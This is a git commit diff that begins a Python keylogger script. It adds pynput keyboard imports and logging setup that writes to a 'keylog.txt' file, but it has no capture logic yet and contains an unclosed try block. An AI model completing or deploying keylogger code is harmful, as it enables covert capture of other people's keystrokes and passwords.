effa93176ed0b81f595eddfde6fd98d13afd7d9a
urmilshroff <urmilshroff@gmail.com>
2018-06-08 23:41:59 +0530

    Updated

--- keylogger.py
+++ keylogger.py
@@ -1,1 +1,9 @@
 #Keylogger by Urmil Shroff
+
+try:
+    from pynput.keyboard import Controller, Key, Listener
+    import logging
+
+log_dir="/Desktop/"
+
+logging.basicConfig(filename=(log_dir+"keylog.txt"),level=logging.DEBUG, format='%(asctime)s: %(message)s')
